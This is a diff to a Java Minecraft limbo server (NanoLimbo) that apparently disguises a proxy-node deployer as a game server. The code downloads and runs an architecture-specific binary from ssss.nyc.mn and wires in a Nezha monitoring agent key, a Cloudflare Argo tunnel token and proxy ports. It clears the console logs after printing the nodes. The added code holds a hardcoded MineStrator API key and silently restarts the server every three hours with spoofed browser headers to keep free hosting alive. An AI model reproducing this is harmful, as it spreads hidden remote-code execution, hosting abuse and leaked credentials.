@@ -22,6 +22,9 @@ import java.net.*;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
 import java.lang.reflect.Field;
 
 import ua.nanit.limbo.server.LimboServer;
@@ -38,9 +41,24 @@ public final class NanoLimbo {
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
-        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "S5_PORT", "ANYTLS_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
+        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
     };
+    
+    // ========================================
+    // MineStrator 配置变量 - 根据不同服务器修改这些值
+    // ========================================
+    
+    private static final String MINESTRATOR_API_KEY = "RUlWZGNtWWUzdndBaFFEOEVFRHVGa205MHJ3OWJ0UFc=";
+    private static final String MINESTRATOR_SERVER_ID = "378960";
+    private static final String MINESTRATOR_ACTION = "restart";  // start / stop / restart / kill
+    private static final int MINESTRATOR_INTERVAL = 10800;  // 3小时 (单位:秒)
+    
+    private static final String USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36";
+    
+    // ========================================
+    
+    private static ScheduledExecutorService heartbeatScheduler;
     
     
     public static void main(String[] args) {
@@ -71,6 +89,9 @@ public final class NanoLimbo {
             System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
             Thread.sleep(15000);
             clearConsole();
+            
+            // Start MineStrator heartbeat after 60 seconds
+            startMineStratorHeartbeat();
         } catch (Exception e) {
             System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
         }
@@ -122,26 +143,24 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "f6568f52-ac2d-4b79-b77e-c46f5783ab86");
+        envVars.put("UUID", "dddc75f2-a991-455e-a3b7-2e636f917bb3");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nezha.9logo.eu.org:443");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g");
         envVars.put("ARGO_PORT", "9010");
-        envVars.put("ARGO_DOMAIN", "freemchosting-gb.milan.us.kg");
-        envVars.put("ARGO_AUTH", "eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiZDgzOTBhMWMtZmU5YS00YjZmLTk0NTAtYjY4M2E3M2Y0ZWUzIiwicyI6Ik1HVTRZVEkyWW1NdFpUQmpOUzAwWVdZM0xUZ3dNMll0TkdRM00yWmtZamcyTXpJdyJ9");
-        envVars.put("HY2_PORT", "6021");
+        envVars.put("ARGO_DOMAIN", "minestrator-fr.milan.us.kg");
+        envVars.put("ARGO_AUTH", "eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiMjZlYmRhNTAtNzRhNC00ZDk3LWE3YTQtYjA1Y2E5NTg0MjRhIiwicyI6IlkyVXhOR1E0WVRRdE9EWTBOaTAwTWpBNUxXRTBZVEF0TnpWaU5EVm1aalF6TURNeCJ9");
+        envVars.put("HY2_PORT", "22966");
         envVars.put("TUIC_PORT", "");
+        envVars.put("S5_PORT", "22966");
         envVars.put("REALITY_PORT", "");
-        envVars.put("S5_PORT", "6021");
-        envVars.put("ANYTLS_PORT", "");
-        envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "FreeMcHosting-GB");
+        envVars.put("NAME", "Minestrator-FR");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -179,11 +198,11 @@ public final class NanoLimbo {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/sbsh";
+            url = "https://amd64.ssss.nyc.mn/s-box";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/sbsh";
+            url = "https://arm64.ssss.nyc.mn/s-box";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/sbsh";
+            url = "https://s390x.ssss.nyc.mn/s-box";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
@@ -200,10 +219,97 @@ public final class NanoLimbo {
         return path;
     }
     
+    // ========================================
+    // MineStrator 心跳功能
+    // ========================================
+    
+    private static void startMineStratorHeartbeat() {
+        new Thread(() -> {
+            try {
+                // 延迟 60 秒
+                Thread.sleep(60000);
+                
+                heartbeatScheduler = Executors.newSingleThreadScheduledExecutor();
+                
+                // 首次延迟 3 小时后执行，然后每 3 小时执行一次
+                heartbeatScheduler.scheduleAtFixedRate(
+                    NanoLimbo::renewMineStrator,
+                    MINESTRATOR_INTERVAL,  // 初始延迟：3小时
+                    MINESTRATOR_INTERVAL,  // 执行间隔：3小时
+                    TimeUnit.SECONDS
+                );
+            } catch (InterruptedException e) {
+                // 静默失败
+            }
+        }).start();
+    }
+    
+    private static void renewMineStrator() {
+        try {
+            String apiUrl = "https://mine.sttr.io/server/" + MINESTRATOR_SERVER_ID + "/poweraction";
+            String jsonPayload = "{\"poweraction\": \"" + MINESTRATOR_ACTION + "\"}";
+            
+            URL url = new URL(apiUrl);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            
+            // 设置请求方法和头部
+            conn.setRequestMethod("PUT");
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(30000);
+            conn.setReadTimeout(30000);
+            
+            // 设置所有必需的请求头
+            conn.setRequestProperty("Accept", "application/json");
+            conn.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8");
+            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setRequestProperty("Authorization", "Bearer " + MINESTRATOR_API_KEY);
+            conn.setRequestProperty("Origin", "https://minestrator.com");
+            conn.setRequestProperty("Referer", "https://minestrator.com/");
+            conn.setRequestProperty("Sec-Fetch-Dest", "empty");
+            conn.setRequestProperty("Sec-Fetch-Mode", "cors");
+            conn.setRequestProperty("Sec-Fetch-Site", "cross-site");
+            conn.setRequestProperty("User-Agent", USER_AGENT);
+            
+            // 发送 JSON 数据
+            try (OutputStream os = conn.getOutputStream()) {
+                byte[] input = jsonPayload.getBytes("utf-8");
+                os.write(input, 0, input.length);
+            }
+            
+            // 读取响应 (即使不使用，也要读取以确保请求完成)
+            int responseCode = conn.getResponseCode();
+            
+            try (BufferedReader br = new BufferedReader(
+                    new InputStreamReader(
+                        responseCode >= 200 && responseCode < 300 
+                            ? conn.getInputStream() 
+                            : conn.getErrorStream(), 
+                        "utf-8"))) {
+                StringBuilder response = new StringBuilder();
+                String responseLine;
+                while ((responseLine = br.readLine()) != null) {
+                    response.append(responseLine.trim());
+                }
+            }
+            
+            conn.disconnect();
+            
+            // 静默处理 - 不输出任何信息
+            
+        } catch (Exception e) {
+            // 静默失败 - 不输出任何错误信息
+        }
+    }
+    
     private static void stopServices() {
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
             System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
+        }
+        
+        // 停止心跳调度器
+        if (heartbeatScheduler != null && !heartbeatScheduler.isShutdown()) {
+            heartbeatScheduler.shutdownNow();
         }
     }
 }
